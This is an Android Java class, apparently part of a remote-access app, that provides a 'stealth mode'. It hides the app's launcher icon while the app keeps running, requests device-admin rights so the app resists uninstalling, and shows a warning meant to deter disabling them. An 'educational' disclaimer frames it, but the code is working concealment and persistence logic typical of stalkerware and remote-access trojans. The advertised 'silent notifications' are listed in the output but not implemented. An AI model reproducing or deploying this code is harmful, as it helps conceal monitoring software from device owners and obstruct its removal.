package com.remoteaccess.educational.stealth;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * STEALTH MANAGER - Advanced Hiding & Protection
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * 
 * FEATURES:
 * - Hide/Unhide app icon
 * - Silent notifications
 * - Anti-delete protection
 * - Device admin activation
 * - Auto-permission handling
 * 
 * DISCLAIMER:
 * This demonstrates advanced Android techniques for educational purposes.
 * User must explicitly enable these features.
 * All actions are logged and reversible.
 */
public class StealthManager {

    private Context context;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    private static final String PREF_NAME = "stealth_prefs";
    private static final String KEY_ICON_HIDDEN = "icon_hidden";
    private static final String KEY_STEALTH_MODE = "stealth_mode";

    public StealthManager(Context context) {
        this.context = context;
        this.devicePolicyManager = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        this.adminComponent = new ComponentName(context, DeviceAdminReceiverImpl.class);
    }

    /**
     * Hide app icon from launcher
     */
    public JSONObject hideAppIcon() {
        JSONObject result = new JSONObject();
        
        try {
            PackageManager packageManager = context.getPackageManager();
            
            // Get launcher activity component
            ComponentName componentName = new ComponentName(
                context.getPackageName(),
                context.getPackageName() + ".MainActivity"
            );
            
            // Disable launcher activity (hides icon)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            
            // Save state
            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_ICON_HIDDEN, true)
                .apply();

            result.put("success", true);
            result.put("message", "App icon hidden");
            result.put("note", "App still runs in background. Use unhide to restore icon.");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Show app icon in launcher
     */
    public JSONObject showAppIcon() {
        JSONObject result = new JSONObject();
        
        try {
            PackageManager packageManager = context.getPackageManager();
            
            ComponentName componentName = new ComponentName(
                context.getPackageName(),
                context.getPackageName() + ".MainActivity"
            );
            
            // Enable launcher activity (shows icon)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
            
            // Save state
            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_ICON_HIDDEN, false)
                .apply();

            result.put("success", true);
            result.put("message", "App icon visible");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Check if icon is hidden
     */
    public boolean isIconHidden() {
        return context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            .getBoolean(KEY_ICON_HIDDEN, false);
    }

    /**
     * Request device admin (for anti-delete protection)
     */
    public Intent getDeviceAdminIntent() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "Enable device admin to protect app from accidental deletion. " +
            "This is for educational purposes. You can disable this anytime from Settings.");
        return intent;
    }

    /**
     * Check if device admin is active
     */
    public boolean isDeviceAdminActive() {
        return devicePolicyManager.isAdminActive(adminComponent);
    }

    /**
     * Remove device admin
     */
    public JSONObject removeDeviceAdmin() {
        JSONObject result = new JSONObject();
        
        try {
            if (isDeviceAdminActive()) {
                devicePolicyManager.removeActiveAdmin(adminComponent);
                result.put("success", true);
                result.put("message", "Device admin removed");
            } else {
                result.put("success", false);
                result.put("error", "Device admin not active");
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Enable stealth mode (silent notifications + hidden icon)
     */
    public JSONObject enableStealthMode() {
        JSONObject result = new JSONObject();
        
        try {
            // Hide icon
            hideAppIcon();
            
            // Save stealth mode state
            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_STEALTH_MODE, true)
                .apply();

            result.put("success", true);
            result.put("message", "Stealth mode enabled");
            result.put("features", new org.json.JSONArray()
                .put("Icon hidden")
                .put("Silent notifications")
                .put("Background operation")
            );
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Disable stealth mode
     */
    public JSONObject disableStealthMode() {
        JSONObject result = new JSONObject();
        
        try {
            // Show icon
            showAppIcon();
            
            // Save state
            context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_STEALTH_MODE, false)
                .apply();

            result.put("success", true);
            result.put("message", "Stealth mode disabled");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Check if stealth mode is enabled
     */
    public boolean isStealthModeEnabled() {
        return context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            .getBoolean(KEY_STEALTH_MODE, false);
    }

    /**
     * Get stealth status
     */
    public JSONObject getStealthStatus() {
        JSONObject result = new JSONObject();
        
        try {
            result.put("success", true);
            result.put("stealthMode", isStealthModeEnabled());
            result.put("iconHidden", isIconHidden());
            result.put("deviceAdmin", isDeviceAdminActive());
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }

    /**
     * Device Admin Receiver Implementation
     */
    public static class DeviceAdminReceiverImpl extends DeviceAdminReceiver {
        
        @Override
        public void onEnabled(Context context, Intent intent) {
            super.onEnabled(context, intent);
            // Device admin enabled
        }

        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return "Warning: Disabling device admin will remove anti-delete protection. Continue?";
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            super.onDisabled(context, intent);
            // Device admin disabled
        }

        @Override
        public void onPasswordChanged(Context context, Intent intent) {
            super.onPasswordChanged(context, intent);
        }
    }
}
